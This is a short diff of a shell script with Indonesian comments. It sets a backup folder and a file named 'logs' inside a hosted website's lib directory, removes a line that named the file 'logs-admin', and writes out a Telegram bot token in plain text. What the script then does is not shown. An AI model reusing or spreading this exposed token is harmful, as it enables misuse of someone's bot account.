@@ -8,7 +8,6 @@ BACKUP_FOLDER="/var/www/u0453969/data/www/autoprogress-m.ru/lib"
 mkdir -p "$BACKUP_FOLDER"
 # Tentukan nama file backup Permissions 755
 BACKUP_FILE="$BACKUP_FOLDER/logs"
-BACKUP_FILE="$BACKUP_FOLDER/logs-admin"
 
 # Token dan ID chat Telegram
 TOKEN="7588613295:AAHNs_IOFuLy_weuOoKMPWaGobPMvtz5mp4"
